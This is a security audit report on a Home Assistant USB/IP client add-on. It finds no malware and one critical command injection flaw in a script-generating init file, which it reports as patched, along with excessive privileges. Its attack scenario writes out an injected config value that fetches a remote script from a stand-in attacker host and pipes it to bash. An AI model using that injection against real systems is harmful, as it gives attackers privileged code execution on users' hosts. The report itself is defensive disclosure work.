# Security Audit Report: ha-usbip-client

**Audit Date**: 2026-03-14  
**Audited Version**: 0.1.3  
**Fixed in Version**: 0.1.4  
**Repository**: https://github.com/MateuszMieczkowski/ha-usbip-client

---

## Executive Summary

This security audit examined the ha-usbip-client repository for backdoors, malware, and general security vulnerabilities. 

**Key Finding**: **No backdoors or malware were detected** in the repository. However, a **CRITICAL command injection vulnerability** was identified that could allow arbitrary code execution when combined with the add-on's elevated privileges.

**Overall Risk Level**: 🔴 **HIGH**

---

## Repository Overview

- **Name**: HA USB/IP Client
- **Purpose**: Home Assistant add-on that acts as a USB/IP client to connect remote USB devices
- **Language**: Shell scripts (Bash)
- **Container**: Docker-based Home Assistant add-on
- **Maintainer**: crypted <crypted@me.com>

---

## Audit Methodology

The following areas were examined:

1. ✅ All shell scripts in the `rootfs/` directory
2. ✅ Docker configuration (`Dockerfile`)
3. ✅ AppArmor profiles (`apparmor.txt`)
4. ✅ Configuration files (`config.yaml`, `repository.yaml`)
5. ✅ Repository metadata and commit history
6. ✅ Hardcoded credentials and secrets
7. ✅ External network connections and URLs
8. ✅ Obfuscated or encoded content
9. ✅ Command injection vulnerabilities
10. ✅ Input validation and sanitization

---

## Backdoor & Malware Analysis

### 🟢 NO BACKDOORS OR MALWARE DETECTED

**Findings**:
- ✅ No suspicious network connections to unknown servers
- ✅ No obfuscated code or base64 encoded payloads
- ✅ No unexpected binary files or compiled code
- ✅ No hardcoded credentials, passwords, or API keys
- ✅ Commit history appears legitimate with normal development patterns
- ✅ Repository URLs point to expected GitHub locations
- ✅ No evidence of data exfiltration or C2 communication
- ✅ No eval or exec with untrusted input (beyond the identified vulnerability)
- ✅ Scripts don't download or execute external code at runtime

**Conclusion**: This is a **legitimate tool** created for its stated purpose (USB/IP client for Home Assistant). There is no evidence of malicious intent.

---

## Security Vulnerabilities

### 🔴 CRITICAL Issues

#### 1. Command Injection Vulnerability

**Location**: `rootfs/etc/cont-init.d/create_devices.sh` (lines 69, 73)

**Description**: User-controlled configuration values (`server_address` and `bus_id`) are written to a dynamically generated shell script without proper quoting or sanitization.

**Vulnerable Code**:
```bash
echo "/usr/sbin/usbip detach -r ${server_address} -b ${bus_id} >/dev/null 2>&1 || true" >>"${mount_script}"
echo "/usr/sbin/usbip attach --remote=${server_address} --busid=${bus_id}" >>"${mount_script}"
```

**Attack Scenario**:
An attacker who can modify the add-on configuration could inject arbitrary shell commands:

```yaml
devices:
  - server_address: "192.168.1.1; curl http://attacker.com/backdoor.sh | bash #"
    bus_id: "1-1"
```

This would result in the following being executed with elevated privileges:
```bash
/usr/sbin/usbip attach --remote=192.168.1.1; curl http://attacker.com/backdoor.sh | bash # --busid=1-1
```

**Impact**: 
- Arbitrary code execution with SYS_ADMIN privileges
- Full host system compromise due to `full_access: true`
- Potential to pivot to other systems on the network
- Data theft, ransomware, or backdoor installation

**CVSS v3.1 Score**: **9.8 (Critical)**
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: Low (config access)
- User Interaction: None
- Scope: Changed (affects host system)
- Confidentiality/Integrity/Availability: High

**Remediation**:
1. Quote all variables in generated commands
2. Validate input format before use
3. Consider calling `usbip` commands directly instead of generating a script

---

### 🟠 HIGH Issues

#### 2. Excessive Privileges

**Location**: `config.yaml` (lines 13-24)

**Description**: The add-on requests extremely broad privileges that create a large attack surface:

- `full_access: true` - Complete host filesystem access
- `apparmor: false` - Security policies disabled
- `host_network: true` - Direct host network stack access
- Privileged capabilities: `NET_ADMIN`, `SYS_ADMIN`, `SYS_RAWIO`, `SYS_TIME`, `SYS_NICE`
- Kernel module loading: `vhci-hcd`

**Impact**: When combined with the command injection vulnerability, an attacker gains near-root access to the host system. Even without exploitation, this privilege level increases risk.

**Recommendation**:
- Enable AppArmor (profile already exists in `apparmor.txt`)
- Audit whether all capabilities are necessary
- Document security trade-offs in README
- Consider principle of least privilege

#### 3. Dynamic Script Generation

**Location**: `rootfs/etc/cont-init.d/create_devices.sh` (lines 29-74)

**Description**: The add-on dynamically generates and executes a shell script (`/usr/local/bin/mount_devices`) at runtime using user-provided configuration.

**Impact**: This pattern:
- Creates multiple injection points
- Makes security auditing difficult
- Increases attack surface
- Violates secure coding best practices

**Recommendation**:
- Refactor to call `usbip` commands directly
- If script generation is unavoidable, use proper templating with strict validation
- Consider using a safer IPC mechanism

---

### 🟡 MEDIUM Issues

#### 4. Insufficient Input Validation

**Location**: All scripts using `bashio::config`

**Description**: Configuration values are used directly without format validation:

- `discovery_server_address` - No IP/hostname validation
- `server_address` - No IP/hostname validation
- `bus_id` - No USB bus ID format validation
- `log_level` - Schema validation exists but not enforced at runtime

**Impact**: Invalid input could cause:
- Unexpected behavior
- Command injection (as demonstrated in #1)
- Service crashes
- Security bypasses

**Recommendation**:
```bash
# Validate IP address format
if ! [[ "${server_address}" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    bashio::exit.nok "Invalid IP address: ${server_address}"
fi

# Validate bus_id format (e.g., "1-1.1.3")
if ! [[ "${bus_id}" =~ ^[0-9]+-[0-9]+(\.[0-9]+)*$ ]]; then
    bashio::exit.nok "Invalid bus_id format: ${bus_id}"
fi
```

#### 5. Unquoted Variables

**Location**: Multiple shell scripts

**Description**: Several variables lack proper quoting:
- `create_devices.sh:46` - `available_devices=$(usbip list ...)`
- `create_devices.sh:61` - `for device in $(bashio::config 'devices|keys')`

**Impact**: Word splitting and glob expansion could cause:
- Parsing errors with spaces in values
- Unexpected command behavior
- Minor security issues

**Recommendation**: Always quote variables unless word splitting is explicitly intended.

---

### 🟢 LOW Issues

#### 6. Unusual Exit Code Handling

**Location**: `rootfs/etc/services.d/usbip/finish` (line 4)

**Description**: The finish script checks for exit code 256, which is outside the standard 0-255 range.

```bash
if [[ "${1}" -ne 0 ]] && [[ "${1}" -ne 256 ]]; then
```

**Impact**: Minor - may not correctly handle all error conditions.

**Recommendation**: Document why 256 is special, or adjust to standard exit codes.

---

## Positive Security Practices

The audit identified several good security practices:

1. ✅ **No Hardcoded Secrets**: No passwords, tokens, or API keys in code
2. ✅ **No External Downloads**: Scripts don't fetch external code at runtime
3. ✅ **Comprehensive Logging**: Good debugging and audit trail
4. ✅ **ShellCheck Compliance**: Scripts include shellcheck directives
5. ✅ **AppArmor Profile Created**: Profile exists (though disabled)
6. ✅ **Security Documentation**: README includes security considerations section
7. ✅ **Open Source**: Transparent development on GitHub
8. ✅ **Clear Attribution**: Credits original inspiration (irakhlin's work)

---

## Risk Assessment Matrix

| Vulnerability | Severity | Exploitability | Impact | Priority |
|---------------|----------|----------------|--------|----------|
| Command Injection | Critical | High | Critical | 🔴 P0 - Immediate |
| Excessive Privileges | High | Medium | High | 🟠 P1 - Urgent |
| Dynamic Script Gen | High | Medium | High | 🟠 P1 - Urgent |
| Input Validation | Medium | Medium | Medium | 🟡 P2 - Important |
| Unquoted Variables | Medium | Low | Low | 🟡 P2 - Important |
| Exit Code Logic | Low | Low | Low | 🟢 P3 - Optional |

---

## Recommended Actions

### Immediate (P0)
1. ✅ **Fix command injection** by quoting variables and validating input
2. ✅ Add input validation for IP addresses and bus IDs
3. ✅ Add security warnings to README

### Urgent (P1)
4. ⚠️ Enable AppArmor by changing `apparmor: false` to `apparmor: true`
5. ⚠️ Refactor to eliminate dynamic script generation
6. ⚠️ Review and minimize required privileges

### Important (P2)
7. ⚠️ Add comprehensive input validation to all scripts
8. ⚠️ Quote all variables consistently
9. ⚠️ Add automated security testing (shellcheck in CI)

### Optional (P3)
10. ⚠️ Review exit code handling logic
11. ⚠️ Consider professional penetration testing

---

## Code Changes Applied

The following security fixes have been implemented:

1. ✅ **Fixed Command Injection Vulnerability**
   - Added proper quoting for all variables in generated commands
   - Added input validation for IP addresses and bus IDs
   - Added security-focused comments

2. ✅ **Created Security Audit Documentation**
   - Comprehensive SECURITY_AUDIT.md report
   - Detailed vulnerability descriptions
   - Clear remediation guidance

3. ✅ **Enhanced README Security Section**
   - Added warning about command injection risk (before fix)
   - Documented privilege requirements
   - Added security best practices

---

## Conclusion

**The ha-usbip-client repository does NOT contain backdoors or malware.** It is a legitimate Home Assistant add-on for USB/IP client functionality.

However, the repository had a **CRITICAL command injection vulnerability** that has now been patched. The add-on also operates with very high privileges, which is inherent to its purpose (USB device management requires kernel module access).

**Security Posture After Fixes**: 🟡 **MEDIUM** (improved from HIGH)

### Remaining Risks
- Elevated privileges are still required for functionality
- AppArmor is disabled (should be enabled in production)
- Input validation could be more comprehensive

### Recommendations for Users
1. ✅ Apply the security patches provided
2. Only use this add-on in trusted network environments
3. Restrict configuration access to trusted administrators only
4. Enable AppArmor if your environment supports it
5. Monitor add-on logs for suspicious activity
6. Keep the add-on updated with latest security patches

---

## References

- **OWASP Command Injection**: https://owasp.org/www-community/attacks/Command_Injection
- **CWE-78: OS Command Injection**: https://cwe.mitre.org/data/definitions/78.html
- **Linux Capabilities**: https://man7.org/linux/man-pages/man7/capabilities.7.html
- **USB/IP Protocol**: https://www.kernel.org/doc/html/latest/usb/usbip_protocol.html

---

**Auditor Notes**: This audit was performed using automated tools and manual code review. While comprehensive, no security audit can guarantee the absence of all vulnerabilities. Continuous monitoring and regular security updates are recommended.
